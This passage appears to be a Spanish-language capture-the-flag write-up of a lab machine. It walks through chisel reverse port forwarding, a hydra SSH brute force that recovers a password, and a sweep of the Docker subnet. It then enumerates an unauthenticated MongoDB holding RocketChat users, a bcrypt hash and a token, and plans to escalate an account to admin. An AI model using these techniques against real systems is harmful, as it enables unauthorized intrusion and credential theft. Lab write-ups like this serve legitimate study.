<p>En nuestro equipo nos ponemos en escucha con <code>chisel</code> por el puerto <code>1234</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo /opt/chisel/chisel server --reverse -p <span style="color:#ae81ff">1234</span>
</span></span></code></pre></div><p><strong>Importante tener permisos de <code>root</code> para esto ya que vamos a utilizar el puerto local 22, y para ello se necesita permisos de superusuario (hasta el puerto 1024)</strong></p>
<p>Ahora en la máquina víctima..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@6d4489211cb5:/tmp$ ./chisel client 10.10.14.91:1234 R:22:172.17.0.1:22
</span></span></code></pre></div><p>Ahora podemos comprobar en nuestra máquina de atacante, que nuestro puerto local 22 es el puerto 22 de la máquina 172.17.0.1.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22 127.0.0.1 -sCV
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-06 21:56 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00020s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 9c:86:6a:02:bf:45:06:52:6c:29:1d:a0:4e:9e:4a:df <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 98:3e:0d:0c:17:d3:2d:98:5f:a2:89:0c:b6:22:9b:33 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 03:51:c3:e8:7a:b3:6e:c6:0c:67:50:ef:b0:b4:e0:37 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h1 id="foothold">Foothold</h1>
<p>Ahora con <code>hydra</code> podemos hacer un ataque por diccionario y&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hydra -L users.txt -P passwords.txt 127.0.0.1 ssh -t <span style="color:#ae81ff">4</span> -I -V
</span></span><span style="display:flex;"><span>Hydra v9.4 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2024-08-06 21:57:55
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">4</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">4</span> tasks, <span style="color:#ae81ff">21</span> login tries <span style="color:#f92672">(</span>l:7/p:3<span style="color:#f92672">)</span>, ~6 tries per task
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://127.0.0.1:22/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 127.0.0.1 - login <span style="color:#e6db74">&#34;janit&#34;</span> - pass <span style="color:#e6db74">&#34;jeO09ufhWD&lt;s&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">21</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 127.0.0.1 - login <span style="color:#e6db74">&#34;janit&#34;</span> - pass <span style="color:#e6db74">&#34;bZ89h}V&lt;S_DA&#34;</span> - <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">21</span> <span style="color:#f92672">[</span>child 1<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 127.0.0.1 - login <span style="color:#e6db74">&#34;janit&#34;</span> - pass <span style="color:#e6db74">&#34;)SQWGm&gt;9KHEA&#34;</span> - <span style="color:#ae81ff">3</span> of <span style="color:#ae81ff">21</span> <span style="color:#f92672">[</span>child 2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 127.0.0.1 - login <span style="color:#e6db74">&#34;saul&#34;</span> - pass <span style="color:#e6db74">&#34;jeO09ufhWD&lt;s&#34;</span> - <span style="color:#ae81ff">4</span> of <span style="color:#ae81ff">21</span> <span style="color:#f92672">[</span>child 3<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 127.0.0.1   login: saul   password: jeO09ufhWD&lt;s
</span></span></code></pre></div><p>Podemos iniciar sesión en la máquina víctima utilizando el combo ``saul:jeO09ufhWD&lt;s`.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sshpass -p <span style="color:#e6db74">&#39;jeO09ufhWD&lt;s&#39;</span> ssh saul@127.0.0.1
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-81-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Tue <span style="color:#ae81ff">06</span> Aug <span style="color:#ae81ff">2024</span> 06:01:21 PM UTC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:                      0.0
</span></span><span style="display:flex;"><span>  Usage of /:                       73.2% of 8.80GB
</span></span><span style="display:flex;"><span>  Memory usage:                     56%
</span></span><span style="display:flex;"><span>  Swap usage:                       30%
</span></span><span style="display:flex;"><span>  Processes:                        <span style="color:#ae81ff">391</span>
</span></span><span style="display:flex;"><span>  Users logged in:                  <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> br-ea74c394a147: 172.18.0.1
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> docker0:         172.17.0.1
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0:            10.129.222.158
</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0:            dead:beef::250:56ff:fe94:f20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">18</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8</span> of these updates are standard security updates.
</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Tue Aug  <span style="color:#ae81ff">6</span> 18:01:02 <span style="color:#ae81ff">2024</span> from 172.17.0.15
</span></span><span style="display:flex;"><span>saul@talkative:~$ whoami
</span></span><span style="display:flex;"><span>saul
</span></span></code></pre></div><p>Recordad que tenemos que iniciar sesión contra la 127.0.0.1:22 ya que por el reverse port-forwarding, este puerto corresponde al puerto 22 de la máquina 172.17.0.1 cuyo servicio SSH no estaba expuesto hacia el exterior.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>saul@talkative:~$ ifconfig eth0
</span></span><span style="display:flex;"><span>eth0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
</span></span><span style="display:flex;"><span>        inet 10.129.222.158  netmask 255.255.0.0  broadcast 10.129.255.255
</span></span><span style="display:flex;"><span>        inet6 dead:beef::250:56ff:fe94:f20  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x0&lt;global&gt;
</span></span><span style="display:flex;"><span>        inet6 fe80::250:56ff:fe94:f20  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x20&lt;link&gt;
</span></span><span style="display:flex;"><span>        ether 00:50:56:94:0f:20  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">146752</span>  bytes <span style="color:#ae81ff">24721297</span> <span style="color:#f92672">(</span>24.7 MB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">119348</span>  bytes <span style="color:#ae81ff">68665418</span> <span style="color:#f92672">(</span>68.6 MB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>Podemos comprobar que estamos en la máquina víctima.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>saul@talkative:~$ cat user.txt
</span></span><span style="display:flex;"><span>56a0d2ba1f6e9e72...
</span></span></code></pre></div><p>Y ya podríamos ver la flag..</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>saul@talkative:/home$ cat /etc/passwd | grep bash
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>saul:x:1000:1000:Saul,,,:/home/saul:/bin/bash
</span></span></code></pre></div><p>Somos el único usuario en el sistema a parte de <code>root</code> , así que supongo que no va a ser necesario migrar de usuario para conseguir la escalada de privilegios.</p>
<p>Una cosa curiosa, es que hay muchas interfaces de red sobre Docker. Así que podríamos intentar enumerar los servicios de docker a ver si encontramos algún contenedor interesante.</p>
<p>Primero vamos a detectar que hosts están activos en el Docker</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..254<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> ping -c <span style="color:#ae81ff">1</span> -W <span style="color:#ae81ff">1</span> 172.17.0.$i &amp;&gt; /dev/null <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Host 172.17.0.</span>$i<span style="color:#e6db74"> is up&#34;</span>; <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host 172.17.0.1 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.2 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.3 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.4 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.5 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.6 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.7 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.8 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.9 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.10 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.11 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.12 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.13 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.14 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.15 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.16 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.17 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.18 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.19 is up
</span></span></code></pre></div><p>Y todos son los hosts que habíamos detectado anteriormente. Como son bastantes, voy a ir enumerando que puertos tienen abiertos uno a uno. (Excepto el 172.17.0.1 ya que es la máquina víctima)</p>
<p>Me interesa este puerto, ya que suele pertenecer a una base de datos <code>MongoDB</code> , en muchas de estas base de datos puedes hacer consultas sin necesidad de estar autenticado.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>saul@talkative:/tmp$ ./portscan.sh 172.17.0.2
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">27017</span>
</span></span></code></pre></div><p>La otra mayoría de máquinas tienen solo abierto el puerto 80 y no contiene nada al hacer un <code>curl</code></p>
<h2 id="reverse-port-forwarding-1">Reverse Port Forwarding</h2>
<p>Así que para analizar este puerto mas a fondo, vamos a hacer otro reverse port-forwarding.</p>
<p>Pero esta vez no necesitamos <code>chisel</code> ya que tenemos la conexión por SSH.</p>
<p>Esta vez, el port-forwarding no lo va a empezar la máquina dentro del contendor, si no la máquina anfitriona, ya que queremos exponer el puerto 27017 de un contenedor hacia nuestra máquina.</p>
<p>No sé si se entenderá pero os dejo un pequeño esquema.
<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
<p>Hacemos el port-forwarding..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sshpass -p <span style="color:#e6db74">&#39;jeO09ufhWD&lt;s&#39;</span> ssh -L 127.0.0.1:27017:172.17.0.2:27017 saul@127.0.0.1
</span></span></code></pre></div><p>Y vemos que efectivamente, este servicio corresponde a una base de datos <code>MongoDB</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p <span style="color:#ae81ff">27017</span> 127.0.0.1 -sCV
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-06 22:20 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00018s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>27017/tcp open  mongodb MongoDB 4.0.26 4.0.26
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><h2 id="enumerating-mongodb">Enumerating MongoDB</h2>
<p>Ahora podemos instalar <code>mongosh</code>, he tomado de referencia esta <a href="https://gainsec.com/2022/01/28/mongodb-cli-client-kali-linux/">publicación</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ mongosh mongodb://127.0.0.1:27017
</span></span><span style="display:flex;"><span>Current Mongosh Log ID:	66b286cfb47184f885838725
</span></span><span style="display:flex;"><span>Connecting to:		mongodb://127.0.0.1:27017/?directConnection<span style="color:#f92672">=</span>true&amp;serverSelectionTimeoutMS<span style="color:#f92672">=</span>2000&amp;appName<span style="color:#f92672">=</span>mongosh+2.2.15
</span></span><span style="display:flex;"><span>Using MongoDB:		4.0.26
</span></span><span style="display:flex;"><span>Using Mongosh:		2.2.15
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>For mongosh info see: https://docs.mongodb.com/mongodb-shell/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------
</span></span><span style="display:flex;"><span>   The server generated these startup warnings when booting
</span></span><span style="display:flex;"><span>   2024-08-06T16:01:00.220+0000: 
</span></span><span style="display:flex;"><span>   2024-08-06T16:01:00.220+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
</span></span><span style="display:flex;"><span>   2024-08-06T16:01:00.220+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
</span></span><span style="display:flex;"><span>   2024-08-06T16:01:01.206+0000: 
</span></span><span style="display:flex;"><span>   2024-08-06T16:01:01.207+0000: ** WARNING: Access control is not enabled <span style="color:#66d9ef">for</span> the database.
</span></span><span style="display:flex;"><span>   2024-08-06T16:01:01.207+0000: **          Read and write access to data and configuration is unrestricted.
</span></span><span style="display:flex;"><span>   2024-08-06T16:01:01.207+0000:
</span></span><span style="display:flex;"><span>------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rs0 <span style="color:#f92672">[</span>direct: primary<span style="color:#f92672">]</span> test&gt;
</span></span></code></pre></div><p>Y sin necesidad de autenticarnos, podemos enumerar la base de datos.</p>
<p>Vemos que hay tablas asociadas a una aplicación llamada <code>rocketchat</code> . De esta aplicación se hablaba en la página principal, además, <code>rocketchat</code> utiliza <code>meteor.js</code>, bonito juego de palabras&hellip;</p>
<pre tabindex="0"><code>rs0 [direct: primary] test&gt; show databases
admin   104.00 KiB
config  124.00 KiB
local    11.37 MiB
meteor    4.64 MiB
rs0 [direct: primary] test&gt; use meteor
switched to db meteor
rs0 [direct: primary] meteor&gt; show collections
_raix_push_app_tokens
_raix_push_notifications
instances
meteor_accounts_loginServiceConfiguration
meteor_oauth_pendingCredentials
meteor_oauth_pendingRequestTokens
migrations
rocketchat__trash
rocketchat_apps
rocketchat_apps_logs
rocketchat_apps_persistence
rocketchat_avatars
rocketchat_avatars.chunks
rocketchat_avatars.files
rocketchat_credential_tokens
rocketchat_cron_history
rocketchat_custom_emoji
rocketchat_custom_sounds
rocketchat_custom_user_status
rocketchat_export_operations
rocketchat_federation_dns_cache
rocketchat_federation_keys
rocketchat_federation_room_events
rocketchat_federation_servers
rocketchat_import
rocketchat_integration_history
rocketchat_integrations
rocketchat_invites
rocketchat_livechat_agent_activity
rocketchat_livechat_custom_field
rocketchat_livechat_department
rocketchat_livechat_department_agents
rocketchat_livechat_external_message
rocketchat_livechat_inquiry
rocketchat_livechat_office_hour
rocketchat_livechat_page_visited
rocketchat_livechat_trigger
rocketchat_livechat_visitor
rocketchat_message
rocketchat_message_read_receipt
rocketchat_oauth_apps
rocketchat_oembed_cache
rocketchat_permissions
rocketchat_reports
rocketchat_roles
rocketchat_room
rocketchat_sessions
rocketchat_settings
rocketchat_smarsh_history
rocketchat_statistics
rocketchat_subscription
rocketchat_uploads
rocketchat_user_data_files
rocketchat_webdav_accounts
ufsTokens
users
usersSessions
view_livechat_queue_status                 [view]
system.views
rs0 [direct: primary] meteor&gt;
</code></pre><h2 id="creating-rocketchat-admin-account">Creating RocketChat admin Account</h2>
<p>Vale, ahora podría modificar la base de datos de <code>rocketchat</code> para poder crear una cuenta de administrador, o intentar crackear los hashes de usuarios pero&hellip; una pregunta&hellip; ¿Dónde está este <code>rocketchat</code>?</p>
<p>Después de volverme loco un rato, escaneé otra vez los puertos por TCP y&hellip;
<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
<p>Supongo que realicé el escaneo inicial de puertos demasiado rápido y no dejé tiempo a iniciar la máquina.
<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
<p><code>db.users.find()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;_id&#34;</span>: <span style="color:#e6db74">&#34;rocket.cat&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;createdAt&#34;</span>: <span style="color:#960050;background-color:#1e0010">ISODate(</span><span style="color:#e6db74">&#34;2021-08-10T19:44:00.224Z&#34;</span><span style="color:#960050;background-color:#1e0010">)</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;avatarOrigin&#34;</span>: <span style="color:#e6db74">&#34;local&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Rocket.Cat&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;rocket.cat&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;online&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;statusDefault&#34;</span>: <span style="color:#e6db74">&#34;online&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;utcOffset&#34;</span>: <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;active&#34;</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;bot&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;_updatedAt&#34;</span>: <span style="color:#960050;background-color:#1e0010">ISODate(</span><span style="color:#e6db74">&#34;2021-08-10T19:44:00.615Z&#34;</span><span style="color:#960050;background-color:#1e0010">)</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;roles&#34;</span>: [ <span style="color:#e6db74">&#34;bot&#34;</span> ]
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;_id&#34;</span>: <span style="color:#e6db74">&#34;ZLMid6a4h5YEosPQi&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;createdAt&#34;</span>: <span style="color:#960050;background-color:#1e0010">ISODate(</span><span style="color:#e6db74">&#34;2021-08-10T19:49:48.673Z&#34;</span><span style="color:#960050;background-color:#1e0010">)</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;services&#34;</span>: {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;password&#34;</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;bcrypt&#34;</span>: <span style="color:#e6db74">&#34;$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y&#34;</span>
</span></span><span style="display:flex;"><span>      },
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;email&#34;</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;verificationTokens&#34;</span>: [
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;address&#34;</span>: <span style="color:#e6db74">&#34;saul@talkative.htb&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;when&#34;</span>: <span style="color:#960050;background-color:#1e0010">ISODate(</span><span style="color:#e6db74">&#34;2021-08-10T19:49:48.738Z&#34;</span><span style="color:#960050;background-color:#1e0010">)</span>
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        ]
</span></span><span style="display:flex;"><span>      },
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;resume&#34;</span>: { <span style="color:#960050;background-color:#1e0010">loginTokens:</span> <span style="color:#960050;background-color:#1e0010">[]</span> }
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;emails&#34;</span>: [ { <span style="color:#960050;background-color:#1e0010">address:</span> <span style="color:#f92672">&#34;saul@talkative.htb&#34;</span>, <span style="color:#960050;background-color:#1e0010">verified:</span> <span style="color:#960050;background-color:#1e0010">false</span> } ],
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;offline&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;active&#34;</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;_updatedAt&#34;</span>: <span style="color:#960050;background-color:#1e0010">ISODate(</span><span style="color:#e6db74">&#34;2024-08-06T16:12:04.633Z&#34;</span><span style="color:#960050;background-color:#1e0010">)</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;roles&#34;</span>: [ <span style="color:#e6db74">&#34;admin&#34;</span> ],
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Saul Goodman&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;lastLogin&#34;</span>: <span style="color:#960050;background-color:#1e0010">ISODate(</span><span style="color:#e6db74">&#34;2022-03-15T17:06:56.543Z&#34;</span><span style="color:#960050;background-color:#1e0010">)</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;statusConnection&#34;</span>: <span style="color:#e6db74">&#34;offline&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;utcOffset&#34;</span>: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p>Antes que ponerme a crackear los hashes, hay una cuenta <code>rocket.cat</code> que tiene el rol de <code>bot</code>. Lo tendré en cuenta.</p>
<p>Y para qué romper el hash si puedo crearme una cuenta de administrador ya que controlo la base de datos.</p>
<p>Primero nos creamos una cuenta de usuario..
<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
<p>Y ahora podemos comprobar en la base de datos que se ha creado mi cuenta correctamente.</p>
<pre tabindex="0"><code>emails: [ { address: &#34;pointed@talkative.htb&#34;, verified: false } ],
    type: &#34;user&#34;,
    status: &#34;online&#34;,
    active: true,
    _updatedAt: ISODate(&#34;2024-08-06T18:38:40.311Z&#34;),
    roles: [ &#34;user&#34; ],
    name: &#34;pointed&#34;,
    lastLogin: ISODate(&#34;2024-08-06T18:38:36.002Z&#34;),
    statusConnection: &#34;online&#34;,
    utcOffset: 2,
    username: &#34;pointed&#34;
</code></pre><p>Y ahora solo habría que cambiar el cambio <code>roles</code> y añadir <code>admin</code> que es lo que tiene el usuario <code>saul</code>. Quiero pensar que así me convertiré en administrador de este servicio.</p>
